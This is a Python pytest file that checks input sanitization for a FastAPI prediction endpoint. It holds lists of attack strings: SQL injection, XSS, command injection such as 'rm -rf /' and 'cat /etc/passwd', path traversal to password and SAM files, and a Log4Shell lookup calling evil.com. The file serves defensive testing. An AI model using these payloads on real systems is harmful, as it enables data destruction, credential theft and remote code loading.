# tests/security/test_input_sanitization.py
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch
import numpy as np
import sys
import os

# Add the parent directory to the Python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from main import app

class TestInputSanitization:
    """Test suite for input sanitization and security"""
    
    @pytest.fixture(scope="class")
    def client(self):
        return TestClient(app)
    
    def test_sql_injection_attempts(self, client):
        """Test that SQL injection attempts are properly handled"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        for payload in sql_injection_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should either validate successfully (if sanitized) or return validation error
            assert response.status_code in [200, 422], f"Unexpected status for payload: {payload}"
            
            if response.status_code == 200:
                data = response.json()
                assert len(data) == 1
                # Ensure the response is properly structured
                assert "estimated_crowd_number" in data[0]
    
    def test_xss_injection_attempts(self, client):
        """Test that XSS injection attempts are properly handled"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process successfully since we're not rendering HTML
            assert response.status_code in [200, 422]
            
            if response.status_code == 200:
                data = response.json()
                assert len(data) == 1
    
    def test_command_injection_attempts(self, client):
        """Test that command injection attempts are properly handled"""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& del *.*",
            "`whoami`",
            "$(id)",
            "; shutdown -h now"
        ]
        
        for payload in command_injection_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process normally as strings
            assert response.status_code in [200, 422]
    
    def test_path_traversal_attempts(self, client):
        """Test that path traversal attempts are properly handled"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process as normal strings
            assert response.status_code in [200, 422]
    
    def test_special_characters_handling(self, client):
        """Test handling of various special characters"""
        special_chars = [
            "Activity with émojis 🎨📸",
            "Activity with ñ and ü characters",
            "Activity with 中文 characters",
            "Activity with русский text",
            "Activity with عربي text",
            "Special chars: !@#$%^&*()_+-=[]{}|;:'\",.<>?",
            "Null bytes: \x00\x01\x02",
            "Unicode: \u0000\u001f\u007f"
        ]
        
        for chars in special_chars:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": chars
            }]
            
            try:
                response = client.post("/predict_batch", json=request)
                # Should handle gracefully
                assert response.status_code in [200, 422, 400]
            except UnicodeEncodeError:
                # Some characters may cause encoding issues - this is expected
                pass
    
    def test_extremely_long_strings(self, client):
        """Test handling of extremely long input strings"""
        # Test various lengths
        long_strings = [
            "A" * 1000,      # 1KB
            "B" * 10000,     # 10KB  
            "C" * 100000,    # 100KB
        ]
        
        for long_string in long_strings:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": long_string
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should either process or reject with appropriate error
            assert response.status_code in [200, 422, 413]  # 413 = Payload Too Large
    
    def test_numeric_injection_in_string_fields(self, client):
        """Test numeric values in string fields"""
        numeric_injections = [
            "123",
            "123.456",
            "-999",
            "1e10",
            "NaN",
            "Infinity",
            "-Infinity"
        ]
        
        for injection in numeric_injections:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": injection
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process as normal strings
            assert response.status_code in [200, 422]
    
    def test_boolean_injection_in_string_fields(self, client):
        """Test boolean values in string fields"""
        boolean_injections = [
            "true",
            "false",
            "True",
            "False",
            "TRUE",
            "FALSE"
        ]
        
        for injection in boolean_injections:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": injection
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process as normal strings
            assert response.status_code in [200, 422]
    
    def test_null_byte_injection(self, client):
        """Test null byte injection attempts"""
        null_byte_payloads = [
            "normal_text\x00malicious_code",
            "file.txt\x00.exe",
            "input\x00\x00\x00extra"
        ]
        
        for payload in null_byte_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            try:
                response = client.post("/predict_batch", json=request)
                # Should handle gracefully
                assert response.status_code in [200, 422, 400]
            except (UnicodeEncodeError, ValueError):
                # Null bytes may cause serialization issues
                pass
    
    def test_format_string_injection(self, client):
        """Test format string injection attempts"""
        format_string_payloads = [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            "{0}{1}{2}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for payload in format_string_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process as normal strings
            assert response.status_code in [200, 422]
    
    def test_regex_injection_attempts(self, client):
        """Test regex injection attempts"""
        regex_payloads = [
            ".*",
            ".+",
            "^.*$",
            "(.*)",
            "(?=.*)",
            ".*(?=.*)",
            "\\.*\\+\\?\\^\\$"
        ]
        
        for payload in regex_payloads:
            request = [{
                "latitude": 40.7589,
                "longitude": -73.9851,
                "hour": 15,
                "month": 7,
                "day": 18,
                "cultural_activity_prefered": payload
            }]
            
            response = client.post("/predict_batch", json=request)
            
            # Should process as normal strings
            assert response.status_code in [200, 422]